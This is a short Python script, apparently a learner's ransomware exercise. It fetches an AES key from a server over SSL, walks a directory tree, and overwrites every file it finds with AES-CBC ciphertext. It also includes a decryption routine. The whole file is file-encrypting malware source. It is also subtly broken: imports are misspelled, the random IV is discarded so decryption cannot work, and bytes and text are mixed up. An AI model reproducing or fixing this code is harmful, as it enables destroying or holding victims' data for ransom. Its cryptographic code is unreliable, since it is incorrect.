import os
import ssl 
import socket
# Cryptografy - we need to do the hashimg of the key
from cryptography.hazmat.primitives.ciphers import Cipher, algoritms, modes
from cryptography.hazmat.backends import dafault_backend
from cryptography.hazmat.primitives import padding

HOST = "127.0.0.1"
PORT = 8080

def encrypt_data(data,random_key):
    # Cipher gives us the simetric(AES) keys in the random mode
    cipher = Cipher(algorithms.AES(random_key), modes.CBC(os.urandom(16)), backend= dafault_backend())
    encryptor = cipher.encryptor()
    # we add bytes to data in order to full up to --> 32 byte as wote in the server
    data_padded = data + (b' ' *(16 - len(data)%16))
    cipher_data = encryptor.update(data_padded) + encryptor.finalize()
    return(cipher_data)

def encrypt_file(path,random_key):
    with open(path, "r+") as file:
        data = file.read()
        encrypt_text=encrypt_data(data,random_key)
        # we can write to the opening of the file 
        file.seek(0)
        file.write(encrypt_text)
        file.truncate()

def iterate_path(path,random_key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root,file)
            encrypt_file(file_path,random_key)
            print("the {} is encrypted".format(file_path))

# decryption
def iterate_path2(path,random_key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path2 = os.path.join(root,file)
            decrypt_file(file_path2,random_key)
            print("the {} is encrypted".format(file_path2))

def decrypt_file(path,random_key):
    with open(path, "r+") as file:
        data = file.read()
        dencrypt_text=dencrypt_data(data,random_key)
        # we can write to the opening of the file 
        file.seek(0)
        file.write(dencrypt_text)
        file.truncate()

def dencrypt_data(data,random_key):
    # Cipher gives us the simetric(AES) keys in the random mode
    cipher = Cipher(algorithms.AES(random_key), modes.CBC(os.urandom(16)), backend= dafault_backend())
    dencryptor = cipher.decryptor()
    # we add bytes to data in order to full up to --> 32 byte as wote in the server
    data_padded = data + (b' ' *(16 - len(data)%16))
    cipher_data = dencryptor.update(data_padded) + dencryptor.finalize()
    return(cipher_data)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_sock = ssl.wrap_socket(sock)
ssl_sock.connect(HOST,PORT)

# the random key from the server( the max bytes that it can receive - 1024)
random_key = ssl_sock.recv(1024)
iterate_path("/path/../,../",random_key)





sock.close()